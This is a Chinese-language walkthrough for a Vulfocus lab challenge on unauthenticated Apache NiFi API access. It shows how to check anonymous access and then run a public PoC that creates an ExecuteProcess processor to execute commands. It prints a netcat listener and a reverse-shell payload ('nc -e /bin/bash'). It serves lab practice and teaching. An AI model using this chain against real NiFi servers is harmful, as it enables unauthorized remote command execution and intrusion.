# Apache NiFi API 未授权命令执行（Vulfocus 题目，无题库 CVE）

> **打法：**先看 `/nifi-api/access/config` 是否显示 `supportsLogin:false`；若匿名可访问，再用公开 PoC 通过 API 创建并启动 `ExecuteProcess` 处理器执行命令。

> 题库：`vulfocus/apache_nifi_api:latest`，内部 Web 端口 `8080`。这题的解题核心是未认证 API/匿名管理权限，不要误标成某个 CVE。

## 步骤

1. 访问 NiFi 页面确认服务，检查匿名访问配置：

```bash
curl -s "http://<IP>:<PORT>/nifi-api/access/config"
```

若返回 JSON 中 `config.supportsLogin` 为 `false`，继续检查根流程组：[S1][S3]

```bash
curl -s "http://<IP>:<PORT>/nifi-api/process-groups/root"
```

能匿名取到流程组信息，说明 API 可访问；若要求登录或返回 401/403，此题公开 PoC 的前提不成立。

2. 下载/使用 [imjdl/Apache-NiFi-Api-RCE](https://github.com/imjdl/Apache-NiFi-Api-RCE) 中的 `exp.py`。在本机监听一个端口：[S1][S2]

```bash
nc -lvnp <监听端口>
```

3. 从本机运行 PoC，让靶场容器连接回来：[S1][S2]

```bash
python3 exp.py "http://<IP>:<PORT>" "nc -e /bin/bash <本机可达IP> <监听端口>"
```

NOSEC 的 Vulfocus 比赛 WP 也使用该 PoC，并以 `nc -e /bin/bash` 建立回连。若容器没有带 `nc -e` 的 netcat，可按环境换成可用的回连命令。


## 关键点

- 这条链依赖 NiFi 允许匿名 API 访问且匿名身份有权管理流程组/处理器；`supportsLogin:false` 是快速判断信号，不单独等于 RCE 已成功。[S1][S3]
- PoC 的做法是创建 `org.apache.nifi.processors.standard.ExecuteProcess` 处理器，再设置命令并运行。[S2][S4]
- PoC 目标格式是 NiFi 服务根地址，不要把 `/nifi` 或 `/nifi-api` 再拼到传入地址末尾。[S1][S2]

## 来源

- **[S1]** [NOSEC：Vulfocus 靶场竞赛中级部分题解，vulfocus/041](https://nosec.org/home/detail/4950.html) — 与本题匹配的 Vulfocus NiFi 赛题 WP，展示 PoC 与回连打法。
- **[S2]** [imjdl/Apache-NiFi-Api-RCE](https://github.com/imjdl/Apache-NiFi-Api-RCE) — WP 使用的 Python PoC；通过 API 新建并运行 `ExecuteProcess` 处理器。
- **[S3]** [ProjectDiscovery Nuclei：Apache NiFi 未授权访问检测模板](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/misconfiguration/apache/apache-nifi-unauth.yaml) — 以 `access/config` 返回 `supportsLogin:false` 识别无需登录的 NiFi。
- **[S4]** [Apache NiFi 1.12.1 ExecuteProcess 处理器文档](https://nifi.apache.org/docs/nifi-docs/components/org.apache.nifi/nifi-standard-nar/1.12.1/org.apache.nifi.processors.standard.ExecuteProcess/) — 对照 PoC 使用的处理器及其命令配置。

来源链接与用途见 [`../sources/003_apache-nifi-api/_meta.md`](../sources/003_apache-nifi-api/_meta.md)。
